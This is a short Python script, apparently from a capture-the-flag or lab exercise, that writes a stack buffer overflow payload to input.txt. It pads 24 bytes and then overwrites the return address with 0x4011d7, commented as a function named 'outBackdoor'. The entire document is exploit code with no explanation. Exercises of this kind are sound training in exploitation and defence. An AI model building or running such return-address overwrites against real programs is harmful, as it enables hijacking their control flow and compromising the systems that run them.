# 0x 00 00 00 00 00 40 11 d7
# 0x4011d7

TOTAL_LENGTH = 50
OFFSET = 24

import struct

RIP = 0x00000000004011d7 # outBackdoor

payload = b"A"*OFFSET
payload += struct.pack("<Q", RIP)
payload += b"C" * (TOTAL_LENGTH - 8 - OFFSET)
payload += b"\n"

f = open("input.txt", "wb")
f.write(payload)
